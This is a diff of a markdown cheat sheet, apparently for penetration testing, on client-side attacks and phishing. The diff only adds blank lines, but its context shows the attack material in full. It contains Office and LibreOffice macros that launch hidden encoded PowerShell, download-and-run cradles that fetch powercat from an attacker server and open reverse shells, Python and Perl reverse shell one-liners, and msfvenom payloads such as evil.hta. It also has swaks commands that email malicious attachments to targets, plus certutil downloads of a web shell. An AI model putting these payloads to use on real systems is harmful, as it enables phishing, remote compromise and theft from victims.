@@ -25,6 +25,7 @@ End Sub
 Sub MyMacro()
     CreateObject("Wscript.Shell").Run "powershell"
 End Sub
+
 ```
 
 
@@ -42,6 +43,7 @@ Sub MyMacro()
     cmdStr = "[Your PowerShell Command]"
     CreateObject("Wscript.Shell").Run cmdStr
 End Sub
+
 ```
 
 
@@ -49,6 +51,7 @@ End Sub
 
 ```powershell
 IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/powercat.ps1]');powercat -c [attacker-ip] -p [port] -e powershell
+
 ```
 
 
@@ -58,6 +61,7 @@ IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/powerca
 $text = "IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/payload.ps1]');powercat -c [attacker-ip] -p [port] -e powershell"
 $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($text))
 Write-Output $encoded
+
 ```
 
 
@@ -70,6 +74,7 @@ chunk_size = 50
 
 for i in range(0, len(cmd_str), chunk_size):
     print(f'Str = Str + "{cmd_str[i:i+chunk_size]}"')
+
 ```
 
 
@@ -94,6 +99,7 @@ Sub MyMacro()
 
     CreateObject("Wscript.Shell").Run "powershell.exe -nop -w hidden -enc " & encodedCmd
 End Sub
+
 ```
 
 
@@ -106,6 +112,7 @@ Observer les permissions et la configuration de Windows.
 
 ```bash
 wsgidav --host=0.0.0.0 --port=[port] --auth=anonymous --root /path/to/webdav/
+
 ```
 
 
@@ -114,6 +121,7 @@ wsgidav --host=0.0.0.0 --port=[port] --auth=anonymous --root /path/to/webdav/
 ```powershell
 # Créez le fichier comme un raccourci dans le système Windows pour préparer l'attaque
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/payload.ps1]');powercat -c [attacker-ip] -p [port] -e powershell"
+
 ```
 
 
@@ -143,6 +151,7 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('[http://
         </searchConnectorDescription>
     </searchConnectorDescriptionList>
 </libraryDescription>
+
 ```
 
 
@@ -166,6 +175,7 @@ Sub MyMacro()
     cmdStr = cmdStr & " -nop -w hidden -enc " & "[Base64 Encoded Command]"
     CreateObject("Wscript.Shell").Run cmdStr
 End Sub
+
 ```
 
 
@@ -183,6 +193,7 @@ Sub MyMacro()
     cmdStr = "cmd.exe /c ""powershell.exe -nop -w hidden -enc " & "[Base64 Encoded Command]" & """"
     CreateObject("Wscript.Shell").Run cmdStr
 End Sub
+
 ```
 
 
@@ -196,6 +207,7 @@ Write-Output $encoded
 
 # Altering PowerShell Execution Policies
 powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand [Your Base64 Encoded Command]
+
 ```
 
 
@@ -204,6 +216,7 @@ powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCo
     var cmd = "[Your JavaScript Command]";
     eval(cmd);
 </script>
+
 ```
 
 
@@ -214,6 +227,7 @@ var cmd = "";
 cmd += "var shell = new ActiveXObject('WScript.Shell');";
 cmd += "shell.Run('cmd.exe /c powershell.exe -nop -w hidden -enc [Base64 Encoded Command]');";
 eval(cmd);
+
 ```
 
 
@@ -221,6 +235,7 @@ eval(cmd);
 
 ```powershell
 net use Z: \\[webdav-server-ip]\DavWWWRoot /user:[username] [password]
+
 ```
 
 
@@ -233,6 +248,7 @@ net use Z: \\[webdav-server-ip]\DavWWWRoot /user:[username] [password]
 sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
 --server [smtp-server-ip] --body [email-body.txt] \
 --header "Subject: [email-subject]" --suppress-data
+
 ```
 
 
@@ -251,6 +267,7 @@ sudo swaks -t <recipient@example.com> --from <sender@example.com> \
 --attach config.Library-ms --server <SMTP_SERVER> --body body.txt \
 --header "Subject: Problems" --suppress-data \
 --auth LOGIN --auth-user <username> --auth-password <password>
+
 ```
 
 
@@ -258,6 +275,7 @@ sudo swaks -t <recipient@example.com> --from <sender@example.com> \
 
 ```text
 --auth LOGIN
+
 ```
 
 
@@ -274,6 +292,7 @@ sudo swaks -t <recipient@example.com> --from <sender@example.com> \
 sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
 --server [smtp-server-ip] --body [email-body.txt] \
 --header "X-Priority: 1 (Highest)" --header "Importance: High" --suppress-data
+
 ```
 
 
@@ -289,6 +308,7 @@ sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
 ```bash
 sendemail -f '[sender]' -t '[recipient]' -s "[smtp_server]:[port]" \
 -u '[subject]' -m '[message]' -a '[attachment]'
+
 ```
 
 
@@ -349,6 +369,7 @@ echo 'import socket,subprocess,os;s=socket.socket();s.connect(("<your_ip>",4444)
 
 # Charge utile alternative Perl Reverse Shell
 echo 'use Socket;$i="<your_ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");' > shell.pl
+
 ```
 
 
@@ -356,6 +377,7 @@ echo 'use Socket;$i="<your_ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyn
 
 ```text
 -f elf
+
 ```
 
 
@@ -363,6 +385,7 @@ echo 'use Socket;$i="<your_ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyn
 
 ```text
 -o shell.elf
+
 ```
 
 
@@ -381,6 +404,7 @@ End Sub
 - wget: Downloads the payload from your web server.  
 - chmod +x: Makes the script executable.  
 - /tmp/shell.sh: Runs the script from /tmp.
+
 ```
 
 
@@ -388,6 +412,7 @@ End Sub
 
 ```bash
 python3 -m http.server 80
+
 ```
 
 
@@ -399,6 +424,7 @@ python3 -m http.server 80
 
 ```bash
 nc -lvnp 4444
+
 ```
 
 
@@ -419,6 +445,7 @@ swaks --to target@example.com --from emmanuel@example.com \
 # 1. La cible ouvre le document LibreOffice.
 # 2. Lorsque la cible permet des macros, la charge utile est téléchargée et exécutée.
 # 3. A reverse shell connects to your Netcat listener.
+
 ```
 
 
@@ -431,6 +458,7 @@ Observer les permissions et la configuration de Windows.
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-psh -o evil.hta
+
 ```
 
 
@@ -438,6 +466,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-ps
 
 ```text
 -f hta-psh
+
 ```
 
 
@@ -445,6 +474,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-ps
 
 ```text
 -o evil.hta
+
 ```
 
 
@@ -457,6 +487,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-ps
 
 ```text
 -f exe -o evil.exe
+
 ```
 
 
@@ -468,6 +499,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-ps
 
 ```text
 -f vbs -o evil.vbs
+
 ```
 
 
@@ -479,6 +511,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-ps
 
 ```text
 -f ps1 -o script.ps1
+
 ```
 
 
@@ -490,6 +523,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-ps
 
 ```text
 -f dll -o payload.dll
+
 ```
 
 
@@ -507,6 +541,7 @@ n = 50  # Chunk size
 for i in range(0, len(s), n):
     chunk = s[i:i + n]
     print('Str = Str + "' + chunk + '"')
+
 ```
 
 
@@ -519,6 +554,7 @@ for i in range(0, len(s), n):
 
 ```text
 Macro Security
+
 ```
 
 
@@ -530,6 +566,7 @@ Macro Security
 
 ```text
 Organize Macros
+
 ```
 
 
@@ -537,6 +574,7 @@ Organize Macros
 
 ```text
 LibreOffice Basic
+
 ```
 
 
@@ -557,6 +595,7 @@ Sub Exploit
     ' Execute the payload using Shell
     Shell Str, 1
 End Sub
+
 ```
 
 
@@ -564,6 +603,7 @@ End Sub
 
 ```text
 <INSERT_YOUR_PAYLOAD_CHUNKS>
+
 ```
 
 
@@ -575,6 +615,7 @@ End Sub
 
 ```text
 -w hidden
+
 ```
 
 
@@ -586,16 +627,19 @@ End Sub
 
 ```text
 Shell Str, 1
+
 ```
 
 
 ```text
 Shell(Str)
+
 ```
 
 
 ```text
 Shell Str, 1
+
 ```
 
 
@@ -607,6 +651,7 @@ Shell Str, 1
 
 ```bash
 nc -lvnp 444
+
 ```
 
 
@@ -618,6 +663,7 @@ swaks --to target@example.com --from emmanuel@example.com \
 --auth-user emmanuel@example.com --auth-password 'your_password' \
 --attach evil.hta --header "Subject: Important Document" \
 --body "Hi,\n\nPlease find the attached document.\n\nBest regards,\nEmmanuel"
+
 ```
 
 
@@ -629,6 +675,7 @@ swaks --to target@example.com --from emmanuel@example.com \
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+
 ```
 
 
@@ -638,6 +685,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 systeminfo
 whoami
 ipconfig /all
+
 ```
 
 
@@ -645,6 +693,7 @@ ipconfig /all
 
 ```text
 cd C:\xampp\htdocs && certutil -urlcache -split -f http://[attacker_ip]/rev.exe && certutil -urlcache -split -f http://[attacker_ip]/shell.pHp
+
 ```
 
 ---
